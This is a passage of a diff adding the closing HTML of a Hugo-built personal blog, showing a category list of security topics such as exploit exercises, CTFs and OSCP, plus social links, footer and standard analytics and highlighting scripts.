+          <a href="/blog/" class="button">See More</a>
+        </footer>
+      
+    </section>
+  
+
+  
+    
+
+      <section id="categories">
+        <header>
+          <h1><a href="/categories">Categories</a></h1>
+        </header>
+        <ul>
+          
+          
+          <li>
+              <a href="/categories/exploit-exercises/">exploit-exercises<span class="count">20</span></a>
+          
+          <li>
+              <a href="/categories/ctf/">ctf<span class="count">4</span></a>
+          
+          <li>
+              <a href="/categories/sans-holiday-hack/">sans-holiday-hack<span class="count">2</span></a>
+          
+          <li>
+              <a href="/categories/homelab/">homelab<span class="count">1</span></a>
+          
+          <li>
+              <a href="/categories/offensive-security/">offensive-security<span class="count">1</span></a>
+          
+          <li>
+              <a href="/categories/oscp/">oscp<span class="count">1</span></a>
+          
+          <li>
+              <a href="/categories/stego/">stego<span class="count">1</span></a>
+          
+          <li>
+              <a href="/categories/synology/">synology<span class="count">1</span></a>
+          
+          </li>
+        </ul>
+      </section>
+    
+  
+
+  
+    <section id="mini-bio">
+      <header>
+        <h1>About</h1>
+      </header>
+      <p>This theme was developed for Hugo static site generator.</p>
+      <footer>
+        <a href="/about" class="button">Learn More</a>
+      </footer>
+    </section>
+  
+</section>
+
+      <footer id="site-footer">
+  
+      <ul class="socnet-icons">
+        
+        <li><a href="//github.com/mike-boya" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="//linkedin.com/in/mike-boya-a444a927" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="//twitter.com/mikeboya" target="_blank" rel="noopener" title="Twitter" class="fab fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+  
+  <p class="copyright">
+    © 2020 Mike Boya
+      <br>
+    Theme: <a href='https://github.com/pacollins/hugo-future-imperfect-slim' target='_blank' rel='noopener'>Hugo Future Imperfect Slim</a><br>A <a href='https://html5up.net/future-imperfect' target='_blank' rel='noopener'>HTML5 UP port</a> | Powered by <a href='https://gohugo.io/' title='0.75.1' target='_blank' rel='noopener'>Hugo</a>
+  </p>
+</footer>
+<a id="back-to-top" href="#" class="fas fa-arrow-up fa-2x"></a>
+
+      <script src="/js/highlight.js"></script>
+    
+    <script>hljs.initHighlightingOnLoad();</script><script src="/js/bundle.min.5955090a3253deadcd66071270aa2274dabe15ffc97094cec252d87b6f3f00bf.js" integrity="sha256-WVUJCjJT3q3NZgcScKoidNq&#43;Ff/JcJTOwlLYe28/AL8="></script>
+    <script src="/js/add-on.js"></script>
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-64695407-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    </div>
+  </body>
+</html>
